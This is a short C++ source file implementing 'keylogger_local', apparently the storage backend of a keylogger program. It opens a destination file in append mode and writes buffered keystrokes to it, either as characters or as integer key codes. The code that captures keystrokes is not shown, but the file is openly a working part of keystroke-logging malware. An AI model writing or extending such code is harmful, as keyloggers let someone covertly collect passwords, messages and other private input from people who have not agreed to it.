#include "./keylogger_local.hpp"

keylogger_local::keylogger_local(size_t p_buffer_size, string p_destination_path) :
		keylogger(p_buffer_size)
{
	a_ofstream = new ofstream();

	a_ofstream->open(p_destination_path.c_str(), std::ofstream::out
			| std::ofstream::app);
}

keylogger_local::~keylogger_local()
{
	a_ofstream->close();

	delete a_ofstream;
}

void keylogger_local::store()
{
	if(a_store_character == true)
		*a_ofstream << *a_buffer << endl;
	else
		for (int index = 0; (*a_buffer)[index] != '\0'; index++)
		{
			*a_ofstream << (int) a_buffer->at(index) << endl;
		}

	a_ofstream->flush();

	a_buffer->clear();
}
